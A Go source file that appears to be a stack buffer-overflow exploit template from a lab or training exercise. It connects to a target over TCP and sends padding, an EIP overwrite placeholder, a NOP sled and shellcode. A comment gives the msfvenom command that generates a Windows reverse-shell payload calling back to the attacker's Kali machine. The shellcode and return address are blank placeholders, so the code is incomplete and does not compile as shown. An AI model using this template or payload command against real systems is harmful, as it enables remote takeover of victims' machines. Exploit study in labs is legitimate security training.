package main

import (
	"fmt"
	"net"
	"os"
	"strings"
)

/* Usage:
   go run 1_spiking_fuzzing.go <IP Address> <Port>
*/

//Generate a payload:
//msfvenom -p windows/shell_reverse_tcp LHOST=<IP Address of Kali Machine> LPORT=<Port of Kali Machine> -f c -a x86 --platform windows -b "\x00\x0A"

func main() {
	ip := os.Args[1]
	port := os.Args[2]
	address := fmt.Sprintf("%s:%s", ip, port)
	conn, err := net.Dial("tcp", address)
		if err != nil {
			fmt.Printf("Connection failed", err.Error())
		}
		
	shellcode := //First line of shellcode
	shellcode += //Second line of shellcode
	shellcode += //Fourth line of shellcode
	//Put more shellcode as necessary
	 
	buff := strings.Repeat("A", 146) + /*Address of EIP*/ + strings.Repeat("\x90", 8) + shellcode + "\r\n"
		
	_, err = conn.Write([]byte(buff))
	if err != nil {
		panic("Connection failed while sending the exploit")
		os.Exit(1)
	}
	conn.Close()
}
